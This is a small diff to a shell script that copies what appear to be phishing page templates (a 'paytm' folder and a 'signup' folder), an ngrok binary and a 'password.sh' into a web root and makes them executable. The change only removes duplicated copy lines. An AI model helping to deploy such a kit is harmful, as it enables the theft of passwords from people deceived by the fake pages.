@@ -52,7 +52,6 @@ case $Choice in
 		cp -R ngrok /var/www/html/
 		cd paytm/
 		cp -R * /var/www/html/
-		cp -R password.sh /var/www/html/
 		cp password.sh /var/www/html/
 		cd /var/www/html/
 		chmod +x *
@@ -79,7 +78,6 @@ case $Choice in
 		cp -R ngrok /var/www/html/
 		cd signup/
 		cp -R * /var/www/html/
-		cp -R password.sh /var/www/html/
 		cp password.sh /var/www/html/
 		cd /var/www/html/
 		chmod +x *
